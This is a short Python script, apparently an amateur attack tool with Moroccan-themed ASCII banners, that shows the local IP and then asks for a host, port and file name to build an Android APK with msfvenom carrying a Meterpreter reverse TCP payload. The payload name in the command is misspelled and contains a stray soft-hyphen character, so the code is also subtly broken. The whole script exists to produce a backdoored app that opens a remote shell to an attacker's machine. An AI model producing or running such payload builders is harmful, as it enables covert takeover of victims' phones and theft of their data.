import os
import datetime
import socket
a="\033[1;30m"
b="\033[1;31m"
c="\033[1;32m"
d="\033[1;33m"
e="\033[1;34m"
f="\033[1;35m"
h="\033[1;36m"
x="\033[1;37m"
v="\033[1;38m"
n="\033[1;39m"
z="\033[1;40m"
os.system('clear')
year=datetime.datetime.now()
print ("\033[40m date and time==>","\033[1;32m",year)
def ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
    print ("""\033[1;36m
=============================""")
    print ("YOUR IP",s.getsockname()[0])
    print ("""
=============================""")    
print ("""\033[1;35m
                           .NNo           `-///:`            
                         .dMMssyyyso/.-ohNNNNNNm.           
                      `:sNMMMdNMMMMmmmNMMMMmMMMMd`          
                .:+shmNNMMMMMNmmmmmNMMMMMMdsMNssds          
             `+hNNMMMMMMMMMMMMMMNNMMMMMMMMy+h++.`h+         
            :mNMMNMMMMMMMMMMMMMMMMMMMMMmyho-:-/syNNs.       
           .NMMMMMNMMMMMMMMMMMMMMMMMMMMNmyo--:+syydNm+`     
      `+dho/NMMMMMMMNMMMMMMMMMMMMMMMMMMMMNNy/dNNNNMMMNhhy-  
    `sdNMMMNdNMMMMMMMNNMMMMNNNNmmmdmmNMMMNNMdmMMMMMNNNmmMNh.
   -yMMMMMMMNmdNMMMMMMMMNhsoooooossyyhhddNMMMMMMNddmNNNMMMM/
  -mNMMMMMMMMNdhdmNMMMNdsosssssoooosssyyyhdNMMNdshNMMMMMMMM/
  :NMMMMNmmNMMMNmhdmmdyhhhddmmmNNNNNmmmdddmhdddmNMMMMNNNMMM/
   :osso:..-:sdmmmNNNsNMNdyssydNMmhssyhmMNNhmNMMNmh+:-.-+yy- 
             `+mNNNNdhMh-`    `ym.    `.sNmmMNdy/
           `/dNNMMNmmhM:      .ys:      `mddo:
          :hNMMMNmmNsNMd/-..-oh-`sy:...:sNNy
         +NNNMNmmNNh`+NNMNmmNN-  `yNmmNNNNh
        -NNNNNhsNNN/`.+mddNNNm/::-oNNNmdmh-``
        ommNNm-dNNN-:+ymdyNNNNNmmNNNNNmhNhs:-.`
          .+mh`mNNNyNNmmmsyyydmNmmddhyyyMhNNdy+-`
        dmmdhh+hmmmhNNmsmmhs+ossooso+ydmyhNNMMMNhssdNNNmh+hh
     yNMMMMMMmNMMNNds:` `odNNNNNNNNNNmy:  -+dNMMMMMMNMMMMNhh
     -hMMMMNMMMMNs:`       -+hmmmmds:`       -oNMMMMMMNNN/
      .mNMMMMMNd-                              -dMMMMMM
       `hMMMMMd`                                `mMMMMN:
        /NNNNN:                                  /mNNNd`
         -//-`   
""")
print ("""\033[1;31m
MAROC=====>MAROC=====>MAROC====>MAROC=====>MAROC===>MAOC
MAOCMAROCMAROCMAROMAROCMARC\033[1;32myNN`\033[1;32mMMARAROCMAROCMAROCMAROCM 
MAROCMAROCMAROCMAROCMAROCM\033[1;31m-M-N+\033[1;32mMAROCMAROCMAROMAROCMAROC
MAROCMAROCMAROCMAROCMAROCM\033[1;31mds om\033[1;32mMAROCMAROCMAROMAROCMAROC		    
MAROCMAROCMAROCMAROCMAROC\033[1;31m/N` `Nh\033[1;32mMAROCMAROCMAROMAROCMARO		            
MAROCMAROCMAROCMAROCMARO\033[1;31m`N+   om\033[1;32mMAROCMAROCMARMAROCMAROC			    
MAROCMAROCMAROC\033[1;31moMmyyyyyyNmyyyyyMdyyyyymMy\033[1;32mMAROCMAROCMARO		    
MAROCMAROCMAROCM\033[1;31m-hh-   .M:     sd   :dy-\033[1;32mMAROCMAROCMAROM			    
MAROCMAROCMAROCMARO\033[1;31m-hh-hh      .M:/dy.\033[1;32mMAROCMAROCMAROMAR		    
MAROCMAROCMAROCMAROC\033[1;31m:dhM.       dMs.\033[1;32mMAROCMAROCMAROMAROC		    
MAROCMAROCMAROMAROCMM\033[1;31mmNy.    +dsM-\033[1;32mMAROCMAROCMAROMAROCMA			    
MAROCMAROCMAROCMAROCM\033[1;31m+N`:ds.+mo` hh\033[1;32mMAROCMAROCMAROMAROCM			    
MAROCMAROCMAROCMAROC\033[1;31m`N+  `dMN.   -M.\033[1;32m MAROCMAROCMAROMARO	            
MAROCMAROCMAROCMAROC\033[1;31msd `sm+`/ms`  hh\033[1;32m MAROCMAROCMAROMARO	            
MAROCMAROCMAROCMARO\033[1;31m.M/sd/     +mo`:M.\033[1;32mMAROCMAROCMARO MAR	            
MAROCMAROCMAROCMARO\033[1;31mhMd/         +moms\033[1;32m MAROCMAROCMAROMAR	            
MAROCMAROCMAROCMAR\33[1;31m/$/-            `oNM\033[1;31m MAROCMAROCMAROMMM    	            
MAROC=====>MAROC====>MAROC=====>MAROC====>MAROC=====>MAROC
""")
ip()
print ("\033[1;33m")
a =input("ENTER THE HOSTE>>>")
b =input("ENTER THE PORT>>>")
d =input("ENTER THE NAME APK>>>")
os.system("msfvenom -p android/meterprter/­rverse_tcp LHOST=" + a + " " + "LPORT=" + b + " " + "R > /sdcard/" + d + ".apk")

